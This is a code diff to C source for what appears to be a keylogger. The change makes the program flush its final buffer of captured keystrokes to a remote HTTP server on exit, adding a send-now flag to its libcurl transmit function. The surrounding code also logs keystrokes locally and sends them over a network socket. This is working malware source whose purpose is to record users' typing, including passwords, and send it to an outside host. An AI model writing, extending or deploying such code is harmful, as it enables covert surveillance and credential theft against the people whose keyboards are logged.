@@ -95,7 +95,7 @@ int main (int argc, char ** argv) {
 					transmit_keystroke_inet(keystroke, &config);
 
 				if(config.log_remote_http)
-					transmit_keystroke_http(keystroke, &config);
+					transmit_keystroke_http(keystroke, &config, 0);
 			}
 	}
 }
@@ -320,7 +320,12 @@ void signal_handler(int sig) {
 void clean_exit(struct config_struct* cfg){
 	if(cfg->logfd != stdout)
 		fclose(cfg->logfd);
-
+	
+	/* Transmit very last keystroke-buffer chunk if HTTP logging is enabled */
+	if (cfg->log_remote_http)
+		transmit_keystroke_http( "", cfg, 1 );
+	
+	/* Free dynamically allocated memory */
 	if( strcmp(cfg->display, X_DEFAULT_DISPLAY) != 0)
 		free( cfg->display );
 	if( cfg->host != NULL )
@@ -366,13 +371,14 @@ int transmit_keystroke_inet(char* key, struct config_struct *opts){
 
 
 #ifdef _HAVE_CURL
-int transmit_keystroke_http(char* key, struct config_struct *cfg){
+int transmit_keystroke_http(char* key, struct config_struct *cfg, int sendnow){
 	CURL* curl;
 	char *http_header_field = HTTP_HEADER_FIELD;
 	char *http_header;
 	static char keystroke_buffer[KEYSTROKE_BUFFER_SIZE + 1]; //+null byte
 
-	if(strlen(keystroke_buffer) + strlen(key) <= (KEYSTROKE_BUFFER_SIZE)) {
+	if( (strlen(keystroke_buffer) + strlen(key) <= (KEYSTROKE_BUFFER_SIZE))
+			&& !sendnow ) {
 		strcat(keystroke_buffer, key);
 		return 2;
 	}
